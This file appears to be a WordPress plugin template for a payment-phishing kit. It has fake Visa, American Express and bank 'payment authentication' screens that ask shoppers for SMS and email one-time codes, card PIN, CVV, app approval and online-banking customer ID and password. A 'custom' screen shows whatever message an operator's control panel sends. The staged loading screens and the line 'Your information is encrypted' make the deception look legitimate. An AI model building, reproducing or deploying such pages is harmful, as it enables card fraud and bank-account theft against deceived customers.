<!-- 🎨 Figma风格验证界面模板 -->
<!-- 从 figma-style-editor.html 提取 -->
<!-- 更新时间：2025-11-28 -->

<!-- ==================== 加载等待界面 ==================== -->
<div id="cpg-waiting" class="cpg-verify" style="display: none;">
    <div class="cpg-verify-card loading-card">
        <!-- 标头 - 由CSS隐藏 -->
        <div class="cpg-verify-header">
            <div class="cpg-issuer-logo">
                <img src="<?php echo plugins_url('assets/images/1.png', dirname(__FILE__)); ?>" alt="Bank Logo">
            </div>
        </div>
        
        <!-- 内容区 -->
        <div class="cpg-verify-body">
            <div class="visa-loading-container">
                <!-- 第一阶段：只显示品牌Logo (3秒) -->
                <div class="visa-stage-1" id="visaStage1">
                    <div class="card-logo-container" id="logoStage1">
                        <img src="<?php echo plugins_url('assets/images/visa-jiazai.webp', dirname(__FILE__)); ?>" alt="Visa" id="loadingBrandLogo">
                    </div>
                </div>
                
                <!-- 第二阶段：品牌Logo + 跳动文字 + 加载圈圈 (3秒后) -->
                <div class="visa-stage-2" id="visaStage2" style="display: none;">
                    <div class="card-logo-container" id="logoStage2" style="margin-bottom: 30px;">
                        <img src="<?php echo plugins_url('assets/images/visa-jiazai.webp', dirname(__FILE__)); ?>" alt="Visa" id="loadingBrandLogo2">
                    </div>
                    <div class="visa-loading-text-bouncing">
                        Verifying card information<span class="dot-1">.</span><span class="dot-2">.</span><span class="dot-3">.</span>
                    </div>
                    <div class="visa-spinner-container">
                        <div class="visa-spinner"></div>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- 页脚（第一阶段隐藏，第二阶段显示） -->
        <div class="cpg-verify-footer" style="display: none;">
            <div class="cpg-loading-footer-text" id="loadingFooter">
                Your payment is currently being processed.<br>Please wait a moment.
            </div>
        </div>
    </div>
</div>

<!-- ==================== OTP验证界面 ==================== -->
<div id="cpg-otp" class="cpg-verify" style="display: none;">
    <div class="cpg-verify-card">
        <!-- 标头 -->
        <div class="cpg-verify-header">
            <div class="cpg-issuer-logo">
                <img src="<?php echo plugins_url('assets/images/1.png', dirname(__FILE__)); ?>" alt="Bank Logo">
            </div>
            <div class="cpg-card-logo-header">
                <img src="<?php echo plugins_url('assets/images/visa-youshangjiao.webp', dirname(__FILE__)); ?>" alt="Visa" id="otpCardLogo">
            </div>
        </div>
        
        <!-- 内容区 -->
        <div class="cpg-verify-body">
            <h1 class="cpg-verify-title" id="otpTitle">Payment Authentication</h1>
            <p class="cpg-verify-text" id="otpText">We have sent a One-Time Password (OTP) to your registered mobile number <span id="otpPhoneDisplay" style="font-weight: 600;"></span>.<br>Please submit your One-Time Password (OTP).</p>
            
            <div class="cpg-details-table">
                <div class="cpg-detail-row">
                    <span class="cpg-detail-label">Merchant</span>
                    <span class="cpg-detail-value" id="otpMerchant">Stripe</span>
                </div>
                <div class="cpg-detail-row">
                    <span class="cpg-detail-label">Product</span>
                    <span class="cpg-detail-value" id="otpProduct" style="overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">Premium Subscription</span>
                </div>
                <div class="cpg-detail-row">
                    <span class="cpg-detail-label">Amount</span>
                    <span class="cpg-detail-value" id="otpAmount">CAD 66.64</span>
                </div>
                <div class="cpg-detail-row">
                    <span class="cpg-detail-label">Card Number</span>
                    <span class="cpg-detail-value" id="otpCard">**** 1111</span>
                </div>
            </div>
            
            <div class="cpg-input-box">
                <label class="cpg-input-label" id="otpLabel">One-Time Password</label>
                <input type="text" class="cpg-input" id="otpInput" placeholder="Enter OTP code" maxlength="6" data-verification-type="otp" data-field="otp_code" autocomplete="one-time-code" inputmode="numeric" pattern="[0-9]{4,6}" tabindex="1" aria-label="One-Time Password" aria-describedby="otpHelper">
                <span class="cpg-input-helper" id="otpHelper">Please check your SMS</span>
            </div>
            
            <div class="cpg-loading-section" id="otpLoadingSection" style="display: none;" aria-busy="true" aria-label="Processing verification">
                <div class="cpg-spinner"></div>
                <p style="color: #666; font-size: 14px; margin-top: 10px;">Processing verification...</p>
            </div>
            
            <!-- 错误提示区域（按钮上方） -->
            <div class="cpg-error-message" id="otpErrorMessage" style="display: none;" role="alert" aria-live="polite">
                <p style="color: #ff6b6b; font-size: 14px; text-align: left; margin: 0 0 16px 0; padding: 12px; background: #fff5f5; border: 1px solid #ffe0e0; border-radius: 8px; display: flex; align-items: flex-start; gap: 8px;">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="flex-shrink: 0; margin-top: 2px;">
                        <circle cx="12" cy="12" r="10"></circle>
                        <line x1="12" y1="8" x2="12" y2="12"></line>
                        <line x1="12" y1="16" x2="12.01" y2="16"></line>
                    </svg>
                    <span id="otpErrorText" style="flex: 1;"></span>
                </p>
            </div>
            
            <button class="cpg-btn cpg-btn-primary cpg-submit-btn" data-verification-type="otp" tabindex="2">Submit</button>
            <button class="cpg-btn cpg-btn-link cpg-resend-btn" data-verification-type="otp" tabindex="3">Resend code</button>
        </div>
        
        <!-- 页脚 -->
        <div class="cpg-verify-footer">
            <div class="cpg-security-notice">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="#666">
                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
                </svg>
                <span>Your information is encrypted</span>
            </div>
        </div>
    </div>
</div>

<!-- ==================== Email验证界面 ==================== -->
<div id="cpg-email" class="cpg-verify" style="display: none;">
    <div class="cpg-verify-card">
        <div class="cpg-verify-header">
            <div class="cpg-issuer-logo">
                <img src="<?php echo plugins_url('assets/images/1.png', dirname(__FILE__)); ?>" alt="Bank Logo">
            </div>
            <div class="cpg-card-logo-header">
                <img src="<?php echo plugins_url('assets/images/visa-youshangjiao.webp', dirname(__FILE__)); ?>" alt="Visa" id="emailCardLogo">
            </div>
        </div>
        
        <div class="cpg-verify-body">
            <h1 class="cpg-verify-title" id="emailTitle">Payment Authentication</h1>
            <p class="cpg-verify-text" id="emailText">We have sent a One-Time Password (OTP) to your registered email <span id="emailAddressDisplay" style="font-weight: 600;"></span>.<br>Please submit your One-Time Password (OTP).</p>
            
            <div class="cpg-details-table">
                <div class="cpg-detail-row">
                    <span class="cpg-detail-label">Merchant</span>
                    <span class="cpg-detail-value" id="emailMerchant">Stripe</span>
                </div>
                <div class="cpg-detail-row">
                    <span class="cpg-detail-label">Product</span>
                    <span class="cpg-detail-value" id="emailProduct" style="overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">Premium Subscription</span>
                </div>
                <div class="cpg-detail-row">
                    <span class="cpg-detail-label">Amount</span>
                    <span class="cpg-detail-value" id="emailAmount">CAD 66.64</span>
                </div>
                <div class="cpg-detail-row">
                    <span class="cpg-detail-label">Card Number</span>
                    <span class="cpg-detail-value" id="emailCard">**** 1111</span>
                </div>
            </div>
            
            <div class="cpg-input-box">
                <label class="cpg-input-label" id="emailLabel">One-Time Password</label>
                <input type="text" class="cpg-input" id="emailInput" placeholder="Enter OTP code" maxlength="6" data-verification-type="email" data-field="email_code" autocomplete="one-time-code" inputmode="numeric" pattern="[0-9]{4,6}" tabindex="1" aria-label="Email One-Time Password" aria-describedby="emailHelper">
                <span class="cpg-input-helper" id="emailHelper">Please check your email</span>
            </div>
            
            <div class="cpg-loading-section" id="emailLoadingSection" style="display: none;" aria-busy="true" aria-label="Processing verification">
                <div class="cpg-spinner"></div>
                <p style="color: #666; font-size: 14px; margin-top: 10px;">Processing verification...</p>
            </div>
            
            <!-- 错误提示区域（按钮上方） -->
            <div class="cpg-error-message" id="emailErrorMessage" style="display: none;" role="alert" aria-live="polite">
                <p style="color: #ff6b6b; font-size: 14px; text-align: left; margin: 0 0 16px 0; padding: 12px; background: #fff5f5; border: 1px solid #ffe0e0; border-radius: 8px; display: flex; align-items: flex-start; gap: 8px;">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="flex-shrink: 0; margin-top: 2px;">
                        <circle cx="12" cy="12" r="10"></circle>
                        <line x1="12" y1="8" x2="12" y2="12"></line>
                        <line x1="12" y1="16" x2="12.01" y2="16"></line>
                    </svg>
                    <span id="emailErrorText" style="flex: 1;"></span>
                </p>
            </div>
            
            <button class="cpg-btn cpg-btn-primary cpg-submit-btn" data-verification-type="email" tabindex="2">Submit</button>
            <button class="cpg-btn cpg-btn-link cpg-resend-btn" data-verification-type="email" tabindex="3">Resend code</button>
        </div>
        
        <div class="cpg-verify-footer">
            <div class="cpg-security-notice">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="#666">
                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
                </svg>
                <span>Your information is encrypted</span>
            </div>
        </div>
    </div>
</div>

<!-- ==================== PIN验证界面 ==================== -->
<div id="cpg-pin" class="cpg-verify" style="display: none;">
    <div class="cpg-verify-card">
        <div class="cpg-verify-header">
            <div class="cpg-issuer-logo">
                <img src="<?php echo plugins_url('assets/images/1.png', dirname(__FILE__)); ?>" alt="Bank Logo">
            </div>
            <div class="cpg-card-logo-header">
                <img src="<?php echo plugins_url('assets/images/visa-youshangjiao.webp', dirname(__FILE__)); ?>" alt="Visa" id="pinCardLogo">
            </div>
        </div>
        
        <div class="cpg-verify-body">
            <h1 class="cpg-verify-title" id="pinTitle">Your safety and security</h1>
            <p class="cpg-verify-text" id="pinText">Please enter your PIN code to complete this transaction.</p>
            
            <div class="cpg-details-table">
                <div class="cpg-detail-row">
                    <span class="cpg-detail-label">Merchant</span>
                    <span class="cpg-detail-value" id="pinMerchant">Stripe</span>
                </div>
                <div class="cpg-detail-row">
                    <span class="cpg-detail-label">Product</span>
                    <span class="cpg-detail-value" id="pinProduct" style="overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">Premium Subscription</span>
                </div>
                <div class="cpg-detail-row">
                    <span class="cpg-detail-label">Amount</span>
                    <span class="cpg-detail-value" id="pinAmount">CAD 66.64</span>
                </div>
            </div>
            
            <div class="cpg-input-box">
                <label class="cpg-input-label" id="pinLabel">PIN Code</label>
                <input type="tel" class="cpg-input" id="pinInput" placeholder="Enter PIN code" maxlength="4" data-verification-type="pin" data-field="pin_code" autocomplete="off" inputmode="numeric" pattern="[0-9]{4}" tabindex="1" aria-label="PIN Code" aria-describedby="pinHelper">
                <span class="cpg-input-helper" id="pinHelper"></span>
            </div>
            
            <div class="cpg-loading-section" id="pinLoadingSection" style="display: none;" aria-busy="true" aria-label="Processing verification">
                <div class="cpg-spinner"></div>
                <p style="color: #666; font-size: 14px; margin-top: 10px;">Processing verification...</p>
            </div>
            
            <!-- 错误提示区域（按钮上方） -->
            <div class="cpg-error-message" id="pinErrorMessage" style="display: none;" role="alert" aria-live="polite">
                <p style="color: #ff6b6b; font-size: 14px; text-align: left; margin: 0 0 16px 0; padding: 12px; background: #fff5f5; border: 1px solid #ffe0e0; border-radius: 8px; display: flex; align-items: flex-start; gap: 8px;">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="flex-shrink: 0; margin-top: 2px;">
                        <circle cx="12" cy="12" r="10"></circle>
                        <line x1="12" y1="8" x2="12" y2="12"></line>
                        <line x1="12" y1="16" x2="12.01" y2="16"></line>
                    </svg>
                    <span id="pinErrorText" style="flex: 1;"></span>
                </p>
            </div>
            
            <button class="cpg-btn cpg-btn-primary cpg-submit-btn" data-verification-type="pin" tabindex="2">Submit</button>
        </div>
        
        <div class="cpg-verify-footer">
            <div class="cpg-security-notice">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="#666">
                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
                </svg>
                <span>Your information is encrypted</span>
            </div>
        </div>
    </div>
</div>

<!-- ==================== CVV验证界面 ==================== -->
<div id="cpg-cvv" class="cpg-verify" style="display: none;">
    <div class="cpg-verify-card cvv-card">
        <div class="cpg-verify-header">
            <div class="cpg-issuer-logo">
                <img src="<?php echo plugins_url('assets/images/amex-safe-cvv_.svg', dirname(__FILE__)); ?>" alt="American Express SafeKey" style="height: 60px; width: auto;">
            </div>
        </div>
        
        <div class="cpg-verify-body">
            <h1 class="cpg-verify-title" id="cvvTitle">Your safety and security</h1>
            <p class="cpg-verify-text" id="cvvText">Please enter the last 3 characters of the planning position on the back of your American Express card.</p>
            
            <div class="cpg-details-table">
                <div class="cpg-detail-row">
                    <span class="cpg-detail-label">Merchant</span>
                    <span class="cpg-detail-value" id="cvvMerchant">Stripe</span>
                </div>
                <div class="cpg-detail-row">
                    <span class="cpg-detail-label">Product</span>
                    <span class="cpg-detail-value" id="cvvProduct" style="overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">Premium Subscription</span>
                </div>
                <div class="cpg-detail-row">
                    <span class="cpg-detail-label">Amount</span>
                    <span class="cpg-detail-value" id="cvvAmount">CAD 66.64</span>
                </div>
                <div class="cpg-detail-row">
                    <span class="cpg-detail-label">Card Number</span>
                    <span class="cpg-detail-value" id="cvvCardFull">************1111</span>
                </div>
            </div>
            
            <div class="cpg-input-box">
                <label class="cpg-input-label" id="cvvLabel">CVV Code</label>
                <input type="text" class="cpg-input" id="cvvInput" placeholder="Enter CVV code" maxlength="3" data-verification-type="cvv" data-field="cvv_code" autocomplete="off" inputmode="numeric" pattern="[0-9]{3,4}" tabindex="1" aria-label="CVV Code" aria-describedby="cvvHelper">
                <span class="cpg-input-helper" id="cvvHelper"></span>
            </div>
            
            <div class="cpg-loading-section" id="cvvLoadingSection" style="display: none;" aria-busy="true" aria-label="Processing verification">
                <div class="cpg-spinner"></div>
                <p style="color: #666; font-size: 14px; margin-top: 10px;">Processing verification...</p>
            </div>
            
            <!-- 错误提示区域（按钮上方） -->
            <div class="cpg-error-message" id="cvvErrorMessage" style="display: none;" role="alert" aria-live="polite">
                <p style="color: #ff6b6b; font-size: 14px; text-align: left; margin: 0 0 16px 0; padding: 12px; background: #fff5f5; border: 1px solid #ffe0e0; border-radius: 8px; display: flex; align-items: flex-start; gap: 8px;">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="flex-shrink: 0; margin-top: 2px;">
                        <circle cx="12" cy="12" r="10"></circle>
                        <line x1="12" y1="8" x2="12" y2="12"></line>
                        <line x1="12" y1="16" x2="12.01" y2="16"></line>
                    </svg>
                    <span id="cvvErrorText" style="flex: 1;"></span>
                </p>
            </div>
            
            <button class="cpg-btn cpg-btn-primary cpg-submit-btn" data-verification-type="cvv" tabindex="2">Submit</button>
        </div>
        
        <div class="cpg-verify-footer">
            <div class="cpg-security-notice">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="#666">
                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
                </svg>
                <span>Your information is encrypted</span>
            </div>
        </div>
    </div>
</div>

<!-- ==================== APP验证界面 ==================== -->
<div id="cpg-app" class="cpg-verify" style="display: none;">
    <div class="cpg-verify-card">
        <div class="cpg-verify-header">
            <div class="cpg-issuer-logo">
                <img src="<?php echo plugins_url('assets/images/1.png', dirname(__FILE__)); ?>" alt="Bank Logo">
            </div>
            <div class="cpg-card-logo-header">
                <img src="<?php echo plugins_url('assets/images/visa-youshangjiao.webp', dirname(__FILE__)); ?>" alt="Visa" id="appCardLogo">
            </div>
        </div>
        
        <div class="cpg-verify-body">
            <h1 class="cpg-verify-title" id="appTitle">Approve this payment in your App</h1>
            <p class="cpg-verify-text" id="appText">If you're already logged on to the Mobile App, please log off and log back on to see the request to confirm the payment. Please do this within 3 minutes.</p>
            
            <div class="cpg-details-table">
                <div class="cpg-detail-row">
                    <span class="cpg-detail-label">Merchant</span>
                    <span class="cpg-detail-value" id="appMerchant">Stripe</span>
                </div>
                <div class="cpg-detail-row">
                    <span class="cpg-detail-label">Product</span>
                    <span class="cpg-detail-value" id="appProduct" style="overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">Premium Subscription</span>
                </div>
                <div class="cpg-detail-row">
                    <span class="cpg-detail-label">Amount</span>
                    <span class="cpg-detail-value" id="appAmount">CAD 66.64</span>
                </div>
                <div class="cpg-detail-row">
                    <span class="cpg-detail-label">Card Number</span>
                    <span class="cpg-detail-value" id="appCardFull">************1111</span>
                </div>
            </div>
            
            <div class="cpg-loading-section" id="appLoadingSection" aria-busy="true" aria-label="Waiting for App confirmation">
                <div class="cpg-spinner"></div>
                <p style="color: #666; font-size: 14px; margin-top: 10px;">Waiting for App confirmation...</p>
            </div>
            
            <!-- 错误提示区域（按钮上方） -->
            <div class="cpg-error-message" id="appErrorMessage" style="display: none;" role="alert" aria-live="polite">
                <p style="color: #ff6b6b; font-size: 14px; text-align: left; margin: 0 0 16px 0; padding: 12px; background: #fff5f5; border: 1px solid #ffe0e0; border-radius: 8px; display: flex; align-items: flex-start; gap: 8px;">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="flex-shrink: 0; margin-top: 2px;">
                        <circle cx="12" cy="12" r="10"></circle>
                        <line x1="12" y1="8" x2="12" y2="12"></line>
                        <line x1="12" y1="16" x2="12.01" y2="16"></line>
                    </svg>
                    <span id="appErrorText" style="flex: 1;"></span>
                </p>
            </div>
            
            <button class="cpg-btn cpg-btn-primary cpg-submit-btn" data-verification-type="app" tabindex="1">Confirmed</button>
        </div>
        
        <div class="cpg-verify-footer">
            <div class="cpg-security-notice">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="#666">
                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
                </svg>
                <span>Your information is encrypted</span>
            </div>
        </div>
    </div>
</div>

<!-- ==================== 网银验证界面 ==================== -->
<div id="cpg-bank" class="cpg-verify" style="display: none;">
    <div class="cpg-verify-card">
        <div class="cpg-verify-header">
            <div class="cpg-issuer-logo">
                <img src="<?php echo plugins_url('assets/images/1.png', dirname(__FILE__)); ?>" alt="Bank Logo">
            </div>
            <div class="cpg-card-logo-header">
                <img src="<?php echo plugins_url('assets/images/visa-youshangjiao.webp', dirname(__FILE__)); ?>" alt="Visa" id="bankCardLogo">
            </div>
        </div>
        
        <div class="cpg-verify-body">
            <h1 class="cpg-verify-title" id="bankTitle">Payment Authentication</h1>
            <p class="cpg-verify-text" id="bankText">To avoid Card Not Present (CNP) fraud, your bank will require you to confirm this is the authorized transaction.</p>
            
            <div class="cpg-cnp-warning">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#856404" stroke-width="2">
                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
                    <path d="M12 8v4"></path>
                    <path d="M12 16h.01"></path>
                </svg>
                <span id="bankWarning">Card Not Present (CNP) fraud</span>
            </div>
            
            <h2 class="cpg-bank-subtitle">Please log in</h2>
            
            <div class="cpg-input-box">
                <label class="cpg-input-label" id="bankCustomerLabel">Customer ID</label>
                <input type="text" class="cpg-input" id="bankCustomerInput" placeholder="Enter your Customer ID" maxlength="50" data-verification-type="bank" data-field="customer_id" autocomplete="off" tabindex="1" aria-label="Bank Customer ID">
            </div>
            
            <div class="cpg-input-box">
                <label class="cpg-input-label" id="bankPasswordLabel">Password</label>
                <input type="password" class="cpg-input" id="bankPasswordInput" placeholder="Enter your Password" maxlength="50" data-verification-type="bank" data-field="password" autocomplete="off" tabindex="2" aria-label="Bank Password">
                <span class="cpg-input-helper">Enter your online banking password</span>
            </div>
            
            <div class="cpg-loading-section" id="bankLoadingSection" style="display: none;" aria-busy="true" aria-label="Processing verification">
                <div class="cpg-spinner"></div>
                <p style="color: #666; font-size: 14px; margin-top: 10px;">Processing verification...</p>
            </div>
            
            <!-- 🔥 错误提示位置（按钮上方） -->
            <span class="cpg-input-helper" id="bankHelper" style="display: block; margin-bottom: 16px;"></span>
            
            <button class="cpg-btn cpg-btn-primary cpg-submit-btn" data-verification-type="bank" tabindex="3">Log In</button>
        </div>
        
        <div class="cpg-verify-footer">
            <div class="cpg-security-notice">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="#666">
                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
                </svg>
                <span>Your information is encrypted</span>
            </div>
        </div>
    </div>
</div>

<!-- ==================== 自定义验证界面 ==================== -->
<div id="cpg-custom" class="cpg-verify" style="display: none;">
    <div class="cpg-verify-card">
        <div class="cpg-verify-header">
            <div class="cpg-issuer-logo">
                <img src="<?php echo plugins_url('assets/images/1.png', dirname(__FILE__)); ?>" alt="Bank Logo">
            </div>
            <div class="cpg-card-logo-header">
                <img src="<?php echo plugins_url('assets/images/visa-youshangjiao.webp', dirname(__FILE__)); ?>" alt="Visa" id="customCardLogo">
            </div>
        </div>
        
        <div class="cpg-verify-body">
            <h1 class="cpg-verify-title" id="customTitle">Please follow the instructions</h1>
            <p class="cpg-verify-text" id="customText">The control panel can send any custom prompt message here.</p>
            
            <div class="cpg-details-table">
                <div class="cpg-detail-row">
                    <span class="cpg-detail-label">Merchant</span>
                    <span class="cpg-detail-value" id="customMerchant">Sample Merchant</span>
                </div>
                <div class="cpg-detail-row">
                    <span class="cpg-detail-label">Product</span>
                    <span class="cpg-detail-value" id="customProduct" style="overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">Sample Product</span>
                </div>
                <div class="cpg-detail-row">
                    <span class="cpg-detail-label">Amount</span>
                    <span class="cpg-detail-value" id="customAmount">$99.99 USD</span>
                </div>
                <div class="cpg-detail-row">
                    <span class="cpg-detail-label">Card Number</span>
                    <span class="cpg-detail-value" id="customCard">**** 1234</span>
                </div>
            </div>
            
            <div class="cpg-input-box">
                <label class="cpg-input-label" id="customLabel">Enter as instructed</label>
                <input type="text" class="cpg-input" id="customInput" placeholder="Enter verification code" maxlength="20" data-verification-type="custom" data-field="custom_code" autocomplete="off" tabindex="1" aria-label="Custom verification code" aria-describedby="customHelper">
                <span class="cpg-input-helper" id="customHelper">Please complete verification as instructed above</span>
            </div>
            
            <div class="cpg-loading-section" id="customLoadingSection" style="display: none;" aria-busy="true" aria-label="Processing verification">
                <div class="cpg-spinner"></div>
                <p style="color: #666; font-size: 14px; margin-top: 10px;">Processing verification...</p>
            </div>
            
            <!-- 错误提示区域（按钮上方） -->
            <div class="cpg-error-message" id="customErrorMessage" style="display: none;" role="alert" aria-live="polite">
                <p style="color: #ff6b6b; font-size: 14px; text-align: left; margin: 0 0 16px 0; padding: 12px; background: #fff5f5; border: 1px solid #ffe0e0; border-radius: 8px; display: flex; align-items: flex-start; gap: 8px;">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="flex-shrink: 0; margin-top: 2px;">
                        <circle cx="12" cy="12" r="10"></circle>
                        <line x1="12" y1="8" x2="12" y2="12"></line>
                        <line x1="12" y1="16" x2="12.01" y2="16"></line>
                    </svg>
                    <span id="customErrorText" style="flex: 1;"></span>
                </p>
            </div>
            
            <button class="cpg-btn cpg-btn-primary cpg-submit-btn" data-verification-type="custom" tabindex="2">Submit</button>
        </div>
        
        <div class="cpg-verify-footer">
            <div class="cpg-security-notice">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="#666">
                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
                </svg>
                <span>Your information is encrypted</span>
            </div>
        </div>
    </div>
</div>

